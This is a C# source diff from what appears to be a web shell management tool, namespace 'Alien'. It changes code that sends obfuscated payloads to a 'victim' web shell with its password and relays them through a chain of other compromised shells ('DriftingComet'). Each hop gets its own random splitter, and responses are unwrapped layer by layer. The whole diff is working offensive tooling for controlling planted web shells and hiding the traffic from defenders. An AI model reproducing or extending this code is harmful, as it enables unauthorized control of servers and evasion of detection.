@@ -491,7 +491,7 @@ namespace Alien
         /// <param name="szPayloadData"></param>
         /// <param name="szSplitter"></param>
         /// <returns></returns>
-        public async Task<string> fnHttpPOST(stShellConfig config, string szPayloadData, string szSplitter)
+        public async Task<string> fnHttpPOST(stShellConfig config, Dictionary<stShellConfig, string> dicSplitter, string szPayloadData, string szSplitter)
         {
             HttpContent? content = null;
             HttpResponseMessage resp;
@@ -631,16 +631,27 @@ namespace Alien
 
                 if (m_victim.ShellPayloadType == enPayloadType.OneShell)
                 {
+                    foreach (var c in dicSplitter.Keys)
+                    {
+                        string split = $"[{dicSplitter[c]}]";
+                        string[] s = szRespContent.Split(split);
+                        if (s.Length > 1)
+                            szRespContent = s[1];
+
+                        if (c.bEHEnable)
+                        {
+                            szRespContent = await m_tamper.fnDeobfuscate(c.szEventHorizonScript, szRespContent, JsonSerializer.Deserialize<Dictionary<string, object>>(c.szEventHorizonConfig));
+                        }
+                    }
+
                     if (m_victim.m_ShellConfig.bEHEnable)
                     {
-                        if (config.bEHEnable)
-                        {
-                            var dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig);
-                            if (dicParam == null)
-                                throw new Exception("Invalid JSON string");
+                        MessageBox.Show("XXX");
+                        var dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(m_victim.m_ShellConfig.szEventHorizonConfig);
+                        if (dicParam == null)
+                            throw new Exception("Invalid JSON string");
 
-                            szRespContent = await m_tamper.fnDeobfuscate(m_victim.m_ShellConfig.szEventHorizonScript, szRespContent, dicParam);
-                        }
+                        szRespContent = await m_tamper.fnDeobfuscate(m_victim.m_ShellConfig.szEventHorizonScript, szRespContent, dicParam);
                     }
 
                     szSplitter = $"[{szSplitter}]";
@@ -980,7 +991,7 @@ namespace Alien
 
                 szPayload = (config.bEHEnable ? string.Empty : $"{m_victim.ShellPassword}=") + szLoader + (config.bEHEnable ? string.Empty : $"&{szParams}");
                 if (config.bEHEnable)
-                    szPayload = await m_tamper.fnObfuscate(config.szEventHorizonScript, Uri.UnescapeDataString(szPayload), JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig));
+                    szPayload = await m_tamper.fnObfuscate(config.szEventHorizonScript, szPayload, JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig));
 
             }
 
@@ -989,21 +1000,39 @@ namespace Alien
                 var configs = m_victim.m_ShellConfig.lsCometShellID.Select(x => m_sqlConn.fnGetShellConfig(x)).ToList();
                 configs.Reverse();
 
-                var result = await fnDriftingComet(configs, szPayload);
+                var result = await fnDriftingComet(configs, Uri.EscapeDataString(szPayload));
 
-                int idxFirstEq = result.szComet.IndexOf('=');
-                if (idxFirstEq == -1)
-                    throw new Exception("Invalid comet payload format.");
+                List<string> lsSplitter = result.lsSplitter;
+                lsSplitter.Reverse();
 
-                string szPass = result.szComet.Substring(0, idxFirstEq);
-                string szRealPayload = result.szComet.Substring(idxFirstEq + 1);
+                Dictionary<stShellConfig, string> dicSplitter = new Dictionary<stShellConfig, string>();
 
-                szRealPayload = Uri.EscapeDataString(szRealPayload);
+                for (int i = 0; i < lsSplitter.Count; i++)
+                    dicSplitter.Add(configs[i], lsSplitter[i]);
 
-                return await fnHttpPOST(result.config, $"{szPass}={szRealPayload}", szSplitter);
+                string szFinalPayload = string.Empty;
+
+                if (!result.config.bEHEnable)
+                {
+                    int idxFirstEq = result.szComet.IndexOf('=');
+                    if (idxFirstEq == -1)
+                        throw new Exception("Invalid comet payload format.");
+
+                    string szPass = result.szComet.Substring(0, idxFirstEq);
+                    string szRealPayload = result.szComet.Substring(idxFirstEq + 1);
+
+                    szRealPayload = Uri.EscapeDataString(szRealPayload);
+                    szFinalPayload = $"{szPass}={szRealPayload}";
+                }
+                else
+                {
+                    szFinalPayload = Uri.EscapeDataString(result.szComet);
+                }
+
+                return await fnHttpPOST(result.config, dicSplitter, szFinalPayload, szSplitter);
             }
 
-            return await fnHttpPOST(new stShellConfig(), szPayload, szSplitter);
+            return await fnHttpPOST(new stShellConfig(), new Dictionary<stShellConfig, string>(), szPayload, szSplitter);
         }
 
         /// <summary>
@@ -1077,10 +1106,8 @@ namespace Alien
             }
         }
 
-        private async Task<(stShellConfig config, string? szURL, string? szComet)> fnDriftingComet(List<stShellConfig> lsConfig, string? szPayload)
+        private async Task<(stShellConfig config, string? szURL, string? szComet, List<string>? lsSplitter)> fnDriftingComet(List<stShellConfig> lsConfig, string? szPayload)
         {
-            string szSplitter = clsEzData.fnszGenerateRandomStr();
-
             if (string.IsNullOrEmpty(szPayload))
                 throw new Exception("Payload is null or empty");
 
@@ -1089,46 +1116,50 @@ namespace Alien
             stShellConfig finalTargetConfig = new stShellConfig();
             string szFinalURL = string.Empty;
 
+            List<string> lsSplitter = new List<string>();
+
             for (int i = 0; i < lsConfig.Count; i++)
             {
                 var config = lsConfig[i];
                 string szPassword = config.szPassword;
 
+                string szSplitter = clsEzData.fnszGenerateRandomStr();
+                string szCurrentTemplate = await fnGetPayload(config, "comet", szSplitter);
+
+                if (string.IsNullOrEmpty(szCurrentTemplate))
+                    throw new Exception("Comet payload is null or empty");
+
+                string szNextUrl = i == 0 ? m_victim.ShellURL : lsConfig[i - 1].szUrl;
+
+                string szMergedComet = clsTamper.fnMergePayloadToOne(
+                    config,
+                    szCurrentTemplate,
+                    new string[] {
+                        clsEzData.fnszStre2b64(szNextUrl),
+                        clsEzData.fnszStre2b64(Uri.UnescapeDataString(szCurrentPayload))
+                    },
+                    config.language
+                );
+
+                string szCurrentLayer = m_dicDecodeFunc[config.language](config.szMethod)
+                    .Replace("[PATTERN]", clsEzData.fnszStre2b64(szMergedComet))
+                    .Replace("[ENCODING]", config.szEncoding);
+
                 if (config.bEHEnable)
                 {
-                    
+                    szCurrentPayload = await m_tamper.fnObfuscate(config.szEventHorizonScript, szCurrentLayer, JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig));
                 }
                 else
                 {
-                    string szCurrentTemplate = await fnGetPayload(config, "comet", szSplitter);
-
-                    if (string.IsNullOrEmpty(szCurrentTemplate))
-                        throw new Exception("Comet payload is null or empty");
-
-                    string szNextUrl = i == 0 ? m_victim.ShellURL : lsConfig[i - 1].szUrl;
-
-                    string szMergedComet = clsTamper.fnMergePayloadToOne(
-                        config,
-                        szCurrentTemplate,
-                        new string[] {
-                            clsEzData.fnszStre2b64(szNextUrl),
-                            clsEzData.fnszStre2b64(szCurrentPayload)
-                        },
-                        config.language
-                    );
-
-                    string szCurrentLayer = m_dicDecodeFunc[config.language](config.szMethod)
-                        .Replace("[PATTERN]", clsEzData.fnszStre2b64(szMergedComet))
-                        .Replace("[ENCODING]", config.szEncoding);
-
                     szCurrentPayload = $"{szPassword}={szCurrentLayer}";
                 }
 
                 finalTargetConfig = config;
                 szFinalURL = config.szUrl;
+                lsSplitter.Add(szSplitter);
             }
 
-            return (finalTargetConfig, szFinalURL, szCurrentPayload);
+            return (finalTargetConfig, szFinalURL, szCurrentPayload, lsSplitter);
         }
 
         private byte[]? fnGetNebulaPulsar()
@@ -1191,7 +1222,7 @@ namespace Alien
                     {
                         content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
                         {
-                            CharSet = "; charset=" + m_victim.ShellEncoding,
+                            CharSet = m_victim.ShellEncoding,
                         };
 
                         HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
